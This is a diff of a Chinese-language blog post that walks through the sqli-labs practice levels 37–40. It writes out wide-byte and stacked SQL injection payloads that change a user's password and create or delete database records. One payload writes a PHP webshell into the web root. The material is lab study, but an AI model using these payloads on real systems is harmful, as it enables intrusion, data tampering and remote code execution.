@@ -34,13 +34,13 @@
   <!-- 页面元数据 -->
   <title>sqli-labs-37-40 - Dr4x3zz</title>
   <meta name="keywords" content="sqli-labs,null">
-  <meta desc name="description" content="sqli-labs-37-40 - Dr4x3zz - Dr4x3zz">
+  <meta desc name="description" content="# sqli-labs-37-40 - Dr4x3zz - Dr4x3zz">
   
 <meta property="og:type" content="article">
 <meta property="og:title" content="sqli-labs-37-40">
 <meta property="og:url" content="https://chenzhengkai10.github.io/2023/03/26/sqli-labs-37-40/index.html">
 <meta property="og:site_name" content="Dr4x3zz">
-<meta property="og:description" content="sqli-labs-37-40">
+<meta property="og:description" content="# sqli-labs-37-40">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2023-03-26T12:46:20.000Z">
@@ -1744,7 +1744,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1728903825782),
+    lastupdate: new Date(1728904039860),
     sidebar: {
       for_page: ["blogger","category","tagcloud","donate"],
       for_post: ["toc"],
@@ -2585,74 +2585,71 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <h1 id="sqli-labs-37-40"><a href="#sqli-labs-37-40" class="headerlink" title="sqli-labs-37-40"></a>sqli-labs-37-40</h1><span id="more"></span>
-
-<h2 id="sqli-labs-37"><a href="#sqli-labs-37" class="headerlink" title="sqli-labs-37"></a>sqli-labs-37</h2><p>使用  <code>&#39; or &#39;1&#39;=&#39;1</code> 发现单引号被注释</p>
-<p><img src="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_26_205247.png" class="lazyload" data-srcset="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_26_205247.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+    <h1 id="sqli-labs-37-40"><a class="markdownIt-Anchor" href="#sqli-labs-37-40">#</a> sqli-labs-37-40</h1>
+<span id="more"></span>
+<h2 id="sqli-labs-37"><a class="markdownIt-Anchor" href="#sqli-labs-37">#</a> sqli-labs-37</h2>
+<p>使用   <code>' or '1'='1</code>  发现单引号被注释</p>
+<p><img src="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_26_205247.png" class="lazyload" data-srcset="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_26_205247.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
 <p>本关也是宽字节注入</p>
-<p>用bp抓包</p>
+<p>用 bp 抓包</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin%df&#x27; union select 1,2#&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_26_213256.png" class="lazyload" data-srcset="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_26_213256.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p><img src="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_26_213301.png" class="lazyload" data-srcset="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_26_213301.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>具体payload就不一一列举了</p>
-<h2 id="sqli-labs-38"><a href="#sqli-labs-38" class="headerlink" title="sqli-labs-38"></a>sqli-labs-38</h2><p>本关虽然可以使用union但是题目告诉我们要使用堆叠注入</p>
+<p><img src="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_26_213256.png" class="lazyload" data-srcset="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_26_213256.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+<p><img src="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_26_213301.png" class="lazyload" data-srcset="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_26_213301.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+<p>具体 payload 就不一一列举了</p>
+<h2 id="sqli-labs-38"><a class="markdownIt-Anchor" href="#sqli-labs-38">#</a> sqli-labs-38</h2>
+<p>本关虽然可以使用 union 但是题目告诉我们要使用堆叠注入</p>
 <p>这里来学习一下堆叠注入</p>
-<h3 id="堆叠注入定义"><a href="#堆叠注入定义" class="headerlink" title="堆叠注入定义"></a>堆叠注入定义</h3><p> Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。</p>
-<h3 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h3><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid&#x3D;1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
-<h3 id="堆叠注入的局限性"><a href="#堆叠注入的局限性" class="headerlink" title="堆叠注入的局限性"></a>堆叠注入的局限性</h3><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
-<p>虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</p>
+<h3 id="堆叠注入定义"><a class="markdownIt-Anchor" href="#堆叠注入定义">#</a> 堆叠注入定义</h3>
+<p>Stacked injections (堆叠注入) 从名词的含义就可以看到应该是一堆 sql 语句 (多条) 一起执行。而在真实的运用中也是这样的，我们知道在 mysql 中，主要是命令行中，每一条语句结尾加；表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。</p>
+<h3 id="堆叠注入原理"><a class="markdownIt-Anchor" href="#堆叠注入原理">#</a> 堆叠注入原理</h3>
+<p>在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在；结束一个 sql 语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于 union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products 服务器端生成的 sql 语句为： Select * from products where productid=1;DELETE FROM products 当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
+<h3 id="堆叠注入的局限性"><a class="markdownIt-Anchor" href="#堆叠注入的局限性">#</a> 堆叠注入的局限性</h3>
+<p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
+<p>虽然我们前面提到了堆叠查询可以执行任意的 sql 语句，但是这种注入方式并不是十分的完美的。在我们的 web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用 union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</p>
 <p>回归本题，我们可以通过堆叠注入更改原来数据库用户的密码、创建数据库等等</p>
-<p>我们来更改一下security数据库中用户Dumb的密码</p>
-<p>id&#x3D;1后成功登录</p>
-<p>id&#x3D;1’报错，闭合单引号</p>
-<p>id&#x3D;1’ –+</p>
-<p>开始更改Dumb的密码</p>
+<p>我们来更改一下 security 数据库中用户 Dumb 的密码</p>
+<p>id=1 后成功登录</p>
+<p>id=1’报错，闭合单引号</p>
+<p>id=1’ --+</p>
+<p>开始更改 Dumb 的密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;;update users set password=&#x27;12345&#x27; where username=&#x27;Dumb&#x27;;--+</span><br></pre></td></tr></table></figure>
-
-<p>这里我使用Navicat Premium 15查看是否更改成功</p>
-<p><img src="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_26_220414.png" class="lazyload" data-srcset="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_26_220414.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>这里我使用 Navicat Premium 15 查看是否更改成功</p>
+<p><img src="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_26_220414.png" class="lazyload" data-srcset="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_26_220414.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
 <p>更改成功</p>
 <p>尝试新建数据库</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;;create database Oblivion10;--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_26_220641.png" class="lazyload" data-srcset="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_26_220641.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_26_220641.png" class="lazyload" data-srcset="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_26_220641.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
 <p>创建表</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;;use Oblivion10;create table tongzheng(id int,user varchar(10));--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_26_221428.png" class="lazyload" data-srcset="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_26_221428.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_26_221428.png" class="lazyload" data-srcset="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_26_221428.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
 <p>创建数据</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=-1&#x27;;insert into oblivion10.tongzheng values(1,&#x27;test1&#x27;);--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_27_221750.png" class="lazyload" data-srcset="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_27_221750.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>用代码插入数据之后用Navicat Premium 15不管怎么改代码怎么尝试一直查看不到，问了学长告诉我mysql需要use一下数据库才可以用，我use了一下数据库之后点进去一看发现弹出了这么多数据，应该是几个代码都没有问题，只是查看不到应该</p>
-<p><img src="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_27_222127.png" class="lazyload" data-srcset="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_27_222127.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>本关还可以用堆叠注入写入webshell</p>
+<p><img src="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_27_221750.png" class="lazyload" data-srcset="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_27_221750.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+<p>用代码插入数据之后用 Navicat Premium 15 不管怎么改代码怎么尝试一直查看不到，问了学长告诉我 mysql 需要 use 一下数据库才可以用，我 use 了一下数据库之后点进去一看发现弹出了这么多数据，应该是几个代码都没有问题，只是查看不到应该</p>
+<p><img src="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_27_222127.png" class="lazyload" data-srcset="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_27_222127.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+<p>本关还可以用堆叠注入写入 webshell</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=-1&#x27;;select &#x27;&lt;?php assert($_POST[less38]);?&gt;&#x27; into outfile &#x27;C:/phpstudy_pro/WWW/less38.php&#x27;-- s</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="sqli-labs-39"><a href="#sqli-labs-39" class="headerlink" title="sqli-labs-39"></a>sqli-labs-39</h2><p>本关无闭合</p>
-<p>也是堆叠注入，学习一下更改38关创建的数据库oblivion10的表tongzheng中id为1 user为test1的记录</p>
+<h2 id="sqli-labs-39"><a class="markdownIt-Anchor" href="#sqli-labs-39">#</a> sqli-labs-39</h2>
+<p>本关无闭合</p>
+<p>也是堆叠注入，学习一下更改 38 关创建的数据库 oblivion10 的表 tongzheng 中 id 为 1 user 为 test1 的记录</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1;update oblivion10.tongzheng set user=&#x27;tzykx&#x27; where id=1 --+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_28_201818.png" class="lazyload" data-srcset="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_28_201818.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>其他如果想新建数据库啊创建表啊添加数据啊可以参考38关的payload这里就不一一列举了</p>
-<h2 id="sqli-labs-40"><a href="#sqli-labs-40" class="headerlink" title="sqli-labs-40"></a>sqli-labs-40</h2><p>本关在尝试单引号闭合的时候发现没有报错，所以盲注</p>
-<p>id&#x3D;1’		页面异常</p>
-<p>id&#x3D;1”   	页面正常</p>
-<p>id&#x3D;1’ –+	异常</p>
-<p>id&#x3D;1’) –+	正常</p>
+<p><img src="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_28_201818.png" class="lazyload" data-srcset="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_28_201818.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
+<p>其他如果想新建数据库啊创建表啊添加数据啊可以参考 38 关的 payload 这里就不一一列举了</p>
+<h2 id="sqli-labs-40"><a class="markdownIt-Anchor" href="#sqli-labs-40">#</a> sqli-labs-40</h2>
+<p>本关在尝试单引号闭合的时候发现没有报错，所以盲注</p>
+<p>id=1’		页面异常</p>
+<p>id=1&quot;   	页面正常</p>
+<p>id=1’ --+	异常</p>
+<p>id=1’) --+	正常</p>
 <blockquote>
-<p>复习一下：如果字段本身是int类型，并且在查询语句中该字段的值被双引号或者单引号包裹，则只要值是以正确数字开头的，后面接多余的字符还是可以返回正确的查询结果，甚至单引号中可以包含双引号，双引号中可以包含单引号。</p>
+<p>复习一下：如果字段本身是 int 类型，并且在查询语句中该字段的值被双引号或者单引号包裹，则只要值是以正确数字开头的，后面接多余的字符还是可以返回正确的查询结果，甚至单引号中可以包含双引号，双引号中可以包含单引号。</p>
 </blockquote>
 <p>找到闭合为’）</p>
 <p>此时开始堆叠注入</p>
-<p>尝试删除数据库oblivion10中tongzheng中的id&#x3D;2 user为test1的记录</p>
-<p><img src="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_28_205915.png" class="lazyload" data-srcset="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_28_205915.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>尝试删除数据库 oblivion10 中 tongzheng 中的 id=2 user 为 test1 的记录</p>
+<p><img src="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_28_205915.png" class="lazyload" data-srcset="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_28_205915.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&#x27;);delete from oblivion10.tongzheng where user=&#x27;test1&#x27; --+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_28_211045.png" class="lazyload" data-srcset="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_28_211045.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p><img src="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_28_211045.png" class="lazyload" data-srcset="/2023/03/26/sqli-labs-37-40/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2023_03_28_211045.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>
 <p>成功删除</p>
 
   </div>
@@ -2704,7 +2701,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://chenzhengkai10.github.io/2023/03/26/sqli-labs-37-40/&title=sqli-labs-37-40 - Dr4x3zz&summary=sqli-labs-37-40"
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://chenzhengkai10.github.io/2023/03/26/sqli-labs-37-40/&title=sqli-labs-37-40 - Dr4x3zz&summary=# sqli-labs-37-40"
           
           >
           
@@ -2716,7 +2713,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://chenzhengkai10.github.io/2023/03/26/sqli-labs-37-40/&title=sqli-labs-37-40 - Dr4x3zz&summary=sqli-labs-37-40"
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://chenzhengkai10.github.io/2023/03/26/sqli-labs-37-40/&title=sqli-labs-37-40 - Dr4x3zz&summary=# sqli-labs-37-40"
           
           >
           
@@ -2728,7 +2725,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=https://chenzhengkai10.github.io/2023/03/26/sqli-labs-37-40/&title=sqli-labs-37-40 - Dr4x3zz&summary=sqli-labs-37-40"
+          target="_blank" href="http://service.weibo.com/share/share.php?url=https://chenzhengkai10.github.io/2023/03/26/sqli-labs-37-40/&title=sqli-labs-37-40 - Dr4x3zz&summary=# sqli-labs-37-40"
           
           >
           
@@ -2763,29 +2760,32 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class='prev' href='/2023/03/28/buuctf-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/'>
           <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>buuctf[极客大挑战2019]EasySQL</p>
-          <p class='content'>buuctf[极客大挑战2019]EasySQL
+          <p class='content'># buuctf [极客大挑战 2019] EasySQL
 
 启动靶机
 
-post注入
+post 注入
 
-可以看到是php写的
-使用php万能密码尝试一下
+可以看到是 php 写的
+使用 php 万能密码尝试一下
 
 
 归纳
-万能密码表PHP‘or 1&#x3D;1&#x2F;*...</p>
+# 万能密码表
+# PHP
+'or...</p>
         </a>
       
       
         <a class='next' href='/2023/01/20/sqli-labs-33-36/'>
           <p class='title'>sqli-labs-33-36<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>sqli-labs-33-36
+          <p class='content'># sqli-labs-33-36
 
-sqli-labs-33
-addslashes() 函数
-在每个双引号（”）前添加反斜杠
-addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。...</p>
+# sqli-labs-33
+
+addslashes () 函数
+在每个双引号（&quot;）前添加反斜杠
+addslashes () 函数返回在预定义字符...</p>
         </a>
       
     </div>
@@ -2843,7 +2843,7 @@ addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。.
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-37"><span class="toc-text">sqli-labs-37</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-38"><span class="toc-text">sqli-labs-38</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%AE%9A%E4%B9%89"><span class="toc-text">堆叠注入定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-text">堆叠注入原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E7%9A%84%E5%B1%80%E9%99%90%E6%80%A7"><span class="toc-text">堆叠注入的局限性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-39"><span class="toc-text">sqli-labs-39</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-40"><span class="toc-text">sqli-labs-40</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-37"><span class="toc-text"> sqli-labs-37</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-38"><span class="toc-text"> sqli-labs-38</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%AE%9A%E4%B9%89"><span class="toc-text"> 堆叠注入定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-text"> 堆叠注入原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E7%9A%84%E5%B1%80%E9%99%90%E6%80%A7"><span class="toc-text"> 堆叠注入的局限性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-39"><span class="toc-text"> sqli-labs-39</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-40"><span class="toc-text"> sqli-labs-40</span></a></li></ol>
     </div>
   </section>
 
@@ -3413,7 +3413,7 @@ addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。.
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/","sameAs":["https://github.com/volantis-x"],"description":"这是我的专属博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://chenzhengkai10.github.io/","name":"Dr4x3zz"}},{"@type":"ListItem","position":2,"item":{"@id":"https://chenzhengkai10.github.io/categories/sqli-labs/","name":"sqli-labs"}},{"@type":"ListItem","position":3,"item":{"@id":"https://chenzhengkai10.github.io/2023/03/26/sqli-labs-37-40/","name":"sqli-labs-37-40"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","keywords":null,"description":"这是我的专属博客","author":{"@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/","description":"这是我的专属博客"},"publisher":{"@type":"Organization","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon